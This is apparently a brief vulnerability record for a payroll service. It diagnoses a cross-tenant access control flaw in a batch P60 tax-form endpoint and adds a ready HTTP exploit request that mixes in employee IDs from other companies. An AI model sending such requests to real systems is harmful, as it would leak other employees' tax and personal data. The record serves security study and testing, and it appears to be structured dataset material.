diagnosis: The batch tax form compilation job receives an array of arbitrary employee IDs and outputs P60 tax documents into a publicly accessible archive without verifying that every employee ID belongs to the requesting company's payroll department. An attacker can bundle target employee IDs from other corporations into their request.
exploit_request:
POST /api/payroll/tax-forms/batch HTTP/1.1
Host: payroll.uk-business-cloud.co.uk
Authorization: Bearer 79|hrmanager9922
Content-Type: application/json

{"employee_ids": [102, 103, 9941, 9942], "archive_name": "batch_tax_p60_export.zip"}
